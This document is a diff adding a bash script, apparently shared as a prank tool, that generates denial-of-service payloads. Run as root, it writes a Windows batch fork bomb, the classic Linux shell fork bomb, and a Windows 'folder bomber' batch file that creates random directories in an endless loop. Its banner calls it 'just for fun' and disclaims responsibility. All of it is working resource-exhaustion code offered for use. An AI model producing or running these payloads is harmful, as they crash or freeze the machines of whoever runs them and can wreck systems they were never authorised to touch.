@@ -1,0 +1,62 @@
+#!/bin/bash
+
+echo -e "\e[45m ANONYMOUS #DEG\e[0m"
+
+echo -e "\e[45m this is simple windows and linux fork bomb creator script written in bash\e[0m"
+echo -e "\e[45m just for fun \e[0m"
+echo -e "\e[45m enjoy and we r not responsible for any action \e[0m"
+
+
+
+
+                                                                                                                                                                     
+                                                  echo -e "\e[45m 
+_    _ _  _ _ _ _ _ _  _ ____ ____ ____ ____ _  _ 
+|    | |\ | | | | | |\ | |    |__/ |__| [__  |__| 
+|___ | | \| |_|_| | | \| |___ |  \ |  | ___] |  | 
+                                                   \e[0m"
+  
+ 
+  
+                            
+
+
+if [ "$EUID" -ne 0 ]
+  then echo "run as root :("
+  exit
+  
+fi
+       val1=windows
+       val2=linux
+read -p "1 for  windows 2 for linux : " windows
+   
+   if [ "$windows" "=" "1" ]; then echo ":fork
+start %0
+%0|%0
+goto :fork" > winfork.bat 
+
+   
+   
+fi
+   
+   if [ "$windows" "=" "2" ]; then echo ":(){ :|:& };:" > linfork.sh
+
+
+
+fi
+
+         val3=winfolder
+         val4=linfolder
+read -p "do u want to continue y or n : " winfolder1
+ if [ "$winfolder1" "=" "y" ]; then read -p " press 1 to generate folder bomber for windows : " log
+ else exit
+ 
+fi
+ 
+ if [ "$log" "=" "1" ]; then echo "echo @ off
+color a 
+:1 
+Mkdir %random% 
+Goto 1" > winfolder.bat
+
+fi
